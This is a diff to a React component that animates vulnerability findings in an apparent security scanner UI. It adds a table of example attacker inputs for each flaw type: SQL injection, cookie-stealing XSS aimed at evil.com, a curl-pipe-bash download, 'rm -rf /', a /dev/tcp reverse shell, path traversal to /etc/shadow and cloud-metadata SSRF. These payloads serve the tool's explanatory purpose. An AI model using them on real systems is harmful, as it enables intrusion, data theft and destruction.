@@ -11,6 +11,10 @@
 //   - Standalone findings (1 path node: sink only, e.g. hardcoded secret,
 //     weak crypto, insecure cookie) -> 2 actors, 1 arrow.
 // Same component handles both; no special-casing needed.
+//
+// CHANGE: added multi-payload scenario toggle. For flow-based vuln types,
+// 2-3 pre-built attacker input scenarios let the user switch payloads and
+// watch the narration/diagram detail change live.
 
 import React, { useEffect, useRef, useState, useCallback } from "react";
 import {
@@ -54,34 +58,262 @@ const SINK_ACTOR = {
 };
 const DEFAULT_SINK_ACTOR = { icon: AlertTriangle, label: "Sink" };
 
+// ── Multi-payload scenarios ────────────────────────────────────────────
+// Each key maps to 2-3 attacker input variants. `stepNarrations` array
+// parallels finding.path: index 0 = source narration, index 1 = sink
+// narration.  For standalone findings (1-step path), use a single-element
+// stepNarrations array.
+const PAYLOAD_SCENARIOS = {
+  "sql-injection": [
+    {
+      label: "UNION extraction",
+      attackerInput: "' UNION SELECT username, password FROM users --",
+      stepNarrations: [
+        "Attacker submits a UNION-based SQL payload through the input field",
+        "The injected UNION reaches db.query() — the database returns all usernames and passwords alongside legitimate results",
+      ],
+    },
+    {
+      label: "Boolean blind",
+      attackerInput: "' AND 1=1 --",
+      stepNarrations: [
+        "Attacker probes with a boolean condition that always evaluates true",
+        "db.query() executes the tautology — by toggling 1=1 vs 1=0 the attacker infers data one bit at a time",
+      ],
+    },
+    {
+      label: "Stacked queries",
+      attackerInput: "'; DROP TABLE users; --",
+      stepNarrations: [
+        "Attacker terminates the original query and appends a destructive DROP TABLE statement",
+        "db.query() executes both statements — the users table is permanently deleted",
+      ],
+    },
+  ],
+  "cross-site-scripting-reflected": [
+    {
+      label: "<script> tag",
+      attackerInput: '<script>document.location="https://evil.com/?c="+document.cookie</script>',
+      stepNarrations: [
+        "Attacker injects a classic <script> tag that exfiltrates cookies",
+        "The unsanitized payload renders in the victim's browser — cookies are sent to the attacker's server",
+      ],
+    },
+    {
+      label: "Event handler",
+      attackerInput: '" onmouseover="alert(document.cookie)" x="',
+      stepNarrations: [
+        "Attacker breaks out of an HTML attribute and injects an onmouseover handler",
+        "When the victim hovers over the element, the injected JavaScript executes in their session",
+      ],
+    },
+    {
+      label: "SVG/onload",
+      attackerInput: '<svg/onload=fetch("https://evil.com/?d="+document.domain)>',
+      stepNarrations: [
+        "Attacker uses an SVG element with an onload event to bypass basic tag filters",
+        "The SVG loads instantly — the browser executes the fetch and leaks the domain to the attacker",
+      ],
+    },
+  ],
+  "cross-site-scripting-dom": [
+    {
+      label: "innerHTML injection",
+      attackerInput: '<img src=x onerror="alert(document.cookie)">',
+      stepNarrations: [
+        "Attacker crafts a malicious HTML string with an error-triggered event handler",
+        "The tainted string is assigned to innerHTML — the browser parses the img tag and fires onerror",
+      ],
+    },
+    {
+      label: "Template literal",
+      attackerInput: '${document.cookie}"><script>fetch("https://evil.com/steal")</script>',
+      stepNarrations: [
+        "Attacker injects a template literal breakout with an embedded script",
+        "innerHTML receives the interpolated payload — the script tag executes in the page context",
+      ],
+    },
+  ],
+  "command-injection": [
+    {
+      label: "Pipe chain",
+      attackerInput: "file.txt | cat /etc/passwd",
+      stepNarrations: [
+        "Attacker appends a pipe operator to chain an unauthorized command",
+        "exec() passes the full string to the shell — /etc/passwd contents are piped back to the attacker",
+      ],
+    },
+    {
+      label: "Subshell $(…)",
+      attackerInput: "$(curl https://evil.com/shell.sh | bash)",
+      stepNarrations: [
+        "Attacker wraps a reverse-shell downloader in a subshell expansion",
+        "The shell expands $() first, downloading and executing the remote script before the original command runs",
+      ],
+    },
+    {
+      label: "Semicolon separator",
+      attackerInput: "; rm -rf / --no-preserve-root",
+      stepNarrations: [
+        "Attacker terminates the intended command with a semicolon and appends a destructive rm",
+        "exec() runs both commands sequentially — the filesystem is wiped from root",
+      ],
+    },
+  ],
+  "path-traversal": [
+    {
+      label: "Classic ../../",
+      attackerInput: "../../../../etc/passwd",
+      stepNarrations: [
+        "Attacker uses repeated ../ sequences to escape the intended directory",
+        "readFile() resolves the relative path and reads /etc/passwd — sensitive system credentials leak",
+      ],
+    },
+    {
+      label: "URL-encoded",
+      attackerInput: "..%2F..%2F..%2Fetc%2Fshadow",
+      stepNarrations: [
+        "Attacker URL-encodes the traversal slashes to bypass naive input filters",
+        "The server decodes %2F back to / before calling readFile() — the shadow file is exposed",
+      ],
+    },
+  ],
+  "code-injection-eval": [
+    {
+      label: "Direct eval",
+      attackerInput: "require('child_process').execSync('whoami').toString()",
+      stepNarrations: [
+        "Attacker submits a Node.js expression that spawns a child process",
+        "eval() executes the string as code — the server runs whoami and returns the result",
+      ],
+    },
+    {
+      label: "Process env leak",
+      attackerInput: "JSON.stringify(process.env)",
+      stepNarrations: [
+        "Attacker requests the full environment variable dump",
+        "eval() serializes process.env — database credentials, API keys, and secrets are exposed",
+      ],
+    },
+  ],
+  "code-injection-function-constructor": [
+    {
+      label: "Constructor RCE",
+      attackerInput: "return require('child_process').execSync('id').toString()",
+      stepNarrations: [
+        "Attacker passes code to the Function constructor that spawns a system command",
+        "new Function() compiles and executes the string — the server identity is leaked",
+      ],
+    },
+    {
+      label: "Reverse shell",
+      attackerInput: "return require('child_process').execSync('bash -i >& /dev/tcp/evil.com/4444 0>&1')",
+      stepNarrations: [
+        "Attacker injects a bash reverse shell via the Function constructor body",
+        "The compiled function opens an interactive shell connection back to the attacker's machine",
+      ],
+    },
+  ],
+  "server-side-request-forgery-ssrf": [
+    {
+      label: "Cloud metadata",
+      attackerInput: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      stepNarrations: [
+        "Attacker points the URL to the AWS instance metadata endpoint",
+        "fetch() hits the internal metadata service — IAM temporary credentials are returned to the attacker",
+      ],
+    },
+    {
+      label: "Internal port scan",
+      attackerInput: "http://127.0.0.1:6379/",
+      stepNarrations: [
+        "Attacker targets localhost on the Redis default port to probe internal services",
+        "fetch() connects to the internal Redis instance — response timing reveals whether the port is open",
+      ],
+    },
+    {
+      label: "file:// protocol",
+      attackerInput: "file:///etc/passwd",
+      stepNarrations: [
+        "Attacker uses the file:// protocol scheme to read local files via the server",
+        "fetch() reads the local filesystem — /etc/passwd contents are returned in the response body",
+      ],
+    },
+  ],
+  "open-redirect": [
+    {
+      label: "External redirect",
+      attackerInput: "https://evil.com/phishing-login",
+      stepNarrations: [
+        "Attacker sets the redirect URL to a phishing page that mimics the legitimate login",
+        "redirect() sends the victim to the attacker's domain — they unknowingly enter credentials on a fake site",
+      ],
+    },
+    {
+      label: "Protocol-relative",
+      attackerInput: "//evil.com/harvest",
+      stepNarrations: [
+        "Attacker uses a protocol-relative URL to bypass scheme-based validation",
+        "redirect() resolves //evil.com using the current protocol — the victim is silently redirected",
+      ],
+    },
+  ],
+};
+
 function normalizeType(type) {
   return (type || "").toLowerCase().replace(/[()]/g, "").trim().replace(/\s+/g, "-");
 }
 
-function buildStepsFromPath(finding) {
-  return (finding.path || []).map((node) => ({
+function buildStepsFromPath(finding, scenario) {
+  return (finding.path || []).map((node, i) => ({
     role: node.type === "source" ? "source" : "sink",
     line: node.line,
     file: node.file,
     snippet: node.snippet,
     text:
-      node.type === "source"
-        ? `Tainted data enters here through ${node.snippet}`
-        : `Data reaches ${node.snippet} — a sensitive operation`,
+      scenario && scenario.stepNarrations[i]
+        ? scenario.stepNarrations[i]
+        : node.type === "source"
+          ? `Tainted data enters here through ${node.snippet}`
+          : `Data reaches ${node.snippet} — a sensitive operation`,
   }));
 }
 
 export default function AttackSimulationView({ finding }) {
-  const [steps, setSteps] = useState(() => buildStepsFromPath(finding));
+  const sinkKey = normalizeType(finding.vulnerability_type);
+  const scenarios = PAYLOAD_SCENARIOS[sinkKey] || null;
+  const hasScenarios = scenarios && scenarios.length > 1;
+
+  const [activeScenario, setActiveScenario] = useState(0);
+  const currentScenario = scenarios ? scenarios[activeScenario] : null;
+
+  const [steps, setSteps] = useState(() => buildStepsFromPath(finding, currentScenario));
   const [currentIndex, setCurrentIndex] = useState(0);
   const [playing, setPlaying] = useState(false);
   const timerRef = useRef(null);
 
+  // Reset everything when the finding changes
   useEffect(() => {
-    setSteps(buildStepsFromPath(finding));
+    setActiveScenario(0);
+    const sc = scenarios ? scenarios[0] : null;
+    setSteps(buildStepsFromPath(finding, sc));
     setCurrentIndex(0);
     setPlaying(false);
   }, [finding]);
+
+  // Rebuild steps when the active scenario changes (but NOT on finding change —
+  // that's handled above)
+  const prevFindingRef = useRef(finding);
+  useEffect(() => {
+    if (prevFindingRef.current === finding) {
+      // Only scenario changed, not the finding
+      const sc = scenarios ? scenarios[activeScenario] : null;
+      setSteps(buildStepsFromPath(finding, sc));
+      setCurrentIndex(0);
+      setPlaying(false);
+    }
+    prevFindingRef.current = finding;
+  }, [activeScenario]);
 
   useEffect(() => {
     if (!playing) return;
@@ -107,10 +339,13 @@ export default function AttackSimulationView({ finding }) {
     setCurrentIndex(i);
   }, []);
 
+  const switchScenario = useCallback((i) => {
+    setActiveScenario(i);
+  }, []);
+
 
   if (!steps.length) return null;
 
-  const sinkKey = normalizeType(finding.vulnerability_type);
   const sinkActor = SINK_ACTOR[sinkKey] || DEFAULT_SINK_ACTOR;
   const SinkIcon = sinkActor.icon;
 
@@ -132,9 +367,30 @@ export default function AttackSimulationView({ finding }) {
 
   return (
     <div className="rounded-xl border border-white/10 bg-black/40 backdrop-blur-md p-5">
-      <div className="flex items-center justify-between mb-6">
+      <div className="flex items-center justify-between mb-4">
         <h3 className="text-sm font-semibold text-white/90 tracking-wide">Attack Simulation</h3>
         <div className="flex items-center gap-2">
+          {/* Scenario toggle buttons */}
+          {hasScenarios && scenarios.map((sc, i) => (
+            <button
+              key={i}
+              onClick={() => switchScenario(i)}
+              className={`text-[10px] px-2.5 py-1 rounded-md border transition-all duration-200 ${
+                i === activeScenario
+                  ? "border-violet-400/50 bg-violet-500/15 text-violet-300 shadow-[0_0_8px_rgba(139,92,246,0.15)]"
+                  : "border-white/10 text-white/40 hover:text-white/60 hover:border-white/20 hover:bg-white/5"
+              }`}
+              title={sc.attackerInput}
+            >
+              {sc.label}
+            </button>
+          ))}
+
+          {/* Divider between scenario buttons and play control */}
+          {hasScenarios && (
+            <div className="w-px h-4 bg-white/10 mx-1" />
+          )}
+
           <button
             onClick={playing ? pause : play}
             className="text-xs px-3 py-1 rounded-md border border-cyan-400/30 text-cyan-300 hover:bg-cyan-400/10 transition-colors"
@@ -143,6 +399,18 @@ export default function AttackSimulationView({ finding }) {
           </button>
         </div>
       </div>
+
+      {/* Active attacker input display */}
+      {currentScenario && (
+        <div className="mb-4 rounded-lg border border-red-500/20 bg-red-500/5 px-3 py-2.5">
+          <div className="text-[10px] uppercase tracking-wider text-red-400/70 mb-1.5 font-medium">
+            Attacker Input
+          </div>
+          <code className="block text-xs font-mono text-red-300 break-all whitespace-pre-wrap leading-relaxed">
+            {currentScenario.attackerInput}
+          </code>
+        </div>
+      )}
 
       {/* Sequence diagram */}
       <div className="relative">
@@ -222,7 +490,7 @@ export default function AttackSimulationView({ finding }) {
                   {/* traveling payload, replays via key remount whenever this step becomes active */}
                   {isActive && (
                     <span
-                      key={`${i}-${playing}-${currentIndex}`}
+                      key={`${i}-${playing}-${currentIndex}-${activeScenario}`}
                       className="absolute top-1/2 -mt-1 w-2 h-2 rounded-full"
                       style={{
                         backgroundColor: color,
